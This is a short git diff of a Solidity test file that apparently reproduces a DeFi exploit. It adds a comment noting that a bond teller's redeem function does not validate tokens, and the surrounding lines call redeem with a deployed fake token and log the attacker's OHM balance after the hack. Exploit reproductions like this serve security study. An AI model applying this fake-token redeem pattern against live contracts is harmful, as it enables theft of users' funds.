@@ -50,7 +50,7 @@ contract AttackContract is Test {
         address fakeToken = address(new FakeToken());
         cheat.label(fakeToken, "FakeToken");
         // console.log("Deploy fake token on ", fakeToken);
-        
+        // redeem function does not check if the token is malcious. 
         IBondFixedExpiryTeller(BondFixedExpiryTeller).redeem(fakeToken, 30437077948152);
         console.log("Redeeming");
         emit log_named_decimal_uint("Attacker OHM Balance after hack", IERC20(OHM).balanceOf(address(this)), 9);
